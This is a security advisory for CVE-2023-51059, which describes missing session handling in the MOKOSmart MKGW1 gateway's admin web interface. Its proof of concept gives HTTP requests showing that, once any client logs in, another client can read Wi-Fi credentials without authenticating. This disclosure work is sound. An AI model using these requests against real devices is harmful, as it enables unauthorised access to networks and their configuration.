# MOKOSmart MKGW1 Gateway Improper Session Management #

## Vulnerability Overview ##

MOKOSmart MKGW1 Gateway devices with firmware version 1.1.1 do
not provide an adequate session management for the administrative web
interface. This allows adjacent attackers with access to the management
network to read and modify the configuration of the device.

* **Identifier**            : SBA-ADV-20220120-01
* **Type of Vulnerability** : Improper Authentication
* **Software/Product Name** : [MOKOSmart MKGW1 BLE Gateway](https://www.mokosmart.com/mokosmart-mkgw1-gateway-iot-cloud-platform/)
* **Vendor**                : [MOKO TECHNOLOGY LTD](https://www.mokosmart.com/)
* **Affected Versions**     : 1.1.1
* **Fixed in Version**      : Not yet
* **CVE ID**                : CVE-2023-51059
* **CVSS Vector**           : CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
* **CVSS Base Score**       : 8.0 (High)

## Vendor Description ##

> * MKGW1 Bluetooth gateway is mainly used for the MOKO Bluetooth products.
> * It is convenient for users to get the data of the MOKO series Beacon,
>   and advertising raw data of any Bluetooth device.
> * It can upload the data to the server via MQTT (V3.1.1) or HTTP(S)
>   protocol.
> * MKGW1 was developed with MediaTek® MT7688AN relying on OpenWrt system
>   and Nordic® nRF52 platform.
> * MKGW1 can connect the standard MQTT Broker, Aws IOT, Azure IOT HUB,
>   Aliyun IOT.

Source: <http://doc.mokotechnology.com/index.php?s=/page/108>

## Impact ##

By exploiting the documented vulnerability, an attacker can gain
administrative access to the device. For example, this can be misused by
altering the configuration of the device or by reading out the configured
network credentials and therefore getting a foothold in the victim's network.

## Vulnerability Description ##

The gateway offers a web-based configuration interface that can be used to
edit the configuration of the gateway. Username and password are requested
to authenticate the administrator. After sending the correct credentials the
device sets a global server-side state to "logged in" for 3600 seconds,
rather than issuing a session ID. Now any device on the same network can
access the configuration interface as administrator without any additional
authentication and read and modify the configuration.

## Proof of Concept ##

Login with the admin credentials on the web interface from a legitimate
client:

HTTP request:

```http
POST /goform/login HTTP/1.1
Host: 192.168.22.1
Content-Type: application/json
Content-Length: 39
Origin: http://192.168.22.1
Connection: close
Referer: http://192.168.22.1/sign_in

{"username":"Admin","password":"[redacted]"}
```

HTTP response:

```http
HTTP/1.1 200 OK
Content-type: application/json
Pragma: no-cache
Cache-Control: no-cache

{ "state": { "code": 2000, "msg": "ok" }, "data": { "activetime": "3600" } }
```

The response shown above does not contain any session identifier.
On another client that can reach the web interface, an attacker can read out
the configuration without any authentication:

HTTP request:

```http
GET /goform/get_wan HTTP/1.1
Host: 192.168.22.1
Connection: close
```

HTTP response:

```http
HTTP/1.1 200 OK
Content-type: application/json

{ "state": { "code": 2000, "msg": "ok" }, "data": { "wanmode": "WIFI", "wanssid": "[redacted]", "wanencrypt": "[redacted]", "wanpassword": "[redacted]", "proto": "dhcp", "ipaddr": "", "netmask": "", "gateway": "", "firdns": "", "secdns": "" } }
```

The above proof-of-concept shows that the MOKO gateway cannot distinguish
between multiple sessions. Therefore, if a legitimate client is logged in,
an attacker can read the configuration. Furthermore, an attacker can also
modify the configuration by sending the appropriate `JSON` data to the
respective `POST` endpoint. Changes to the network can trigger a reboot
of the device.

## Recommended Countermeasures ##

We are not aware of a vendor fix yet. Please contact the vendor.

We recommend to implement a proper session management for the
administrative web interface of the device.

## Timeline ##

* `2022-01-20`: identification of vulnerability in version 1.1.1
* `2022-01-27`: initial vendor contact
* `2022-03-02`: disclosed vulnerability to vendor contact but received no reply
* `2023-12-11`: request CVE from MITRE
* `2023-12-12`: public disclosure
* `2024-01-09`: MITRE assigned CVE-2023-51059

## References ##

* [Moko Gateway Documentation](https://www.mokosmart.com/wp-content/uploads/2019/10/GS-gateway.pdf)

## Credits ##

* Jakob Hagl ([SBA Research](https://www.sba-research.org/))
* David Lisa Gnedt ([SBA Research](https://www.sba-research.org/))
